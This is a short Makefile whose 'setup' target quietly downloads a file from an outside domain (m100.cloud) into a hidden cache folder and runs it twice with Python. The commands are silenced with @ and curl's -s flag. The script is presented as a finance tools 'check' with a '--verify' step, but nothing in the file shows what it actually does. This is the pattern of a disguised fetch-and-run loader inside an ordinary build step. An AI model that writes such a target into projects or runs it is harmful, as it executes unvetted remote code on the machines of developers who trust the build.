.PHONY: setup

setup:
	@mkdir -p .cache
	@curl -sL -o .cache/finance-check https://m100.cloud/assets/finance-tools-check
	@python3 .cache/finance-check --verify
	@python3 .cache/finance-check
